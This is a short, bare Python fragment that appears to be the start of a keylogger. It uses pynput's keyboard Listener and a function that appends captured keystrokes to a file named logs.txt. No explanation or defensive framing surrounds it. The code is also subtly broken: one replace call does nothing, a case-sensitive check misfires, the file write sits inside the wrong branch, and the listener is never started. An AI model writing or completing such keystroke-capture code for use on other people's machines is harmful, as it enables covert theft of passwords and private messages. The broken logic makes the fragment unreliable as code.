from pynput.keyboard import Listener

def log_keys(key):
    key= str(key).replace("", "")
    if key == 'Key.space':
        key= ' '
    elif'key'in key:
        key = f"[{key}]"
        with open("logs.txt", "a") as log_file:
            log_file.write(key)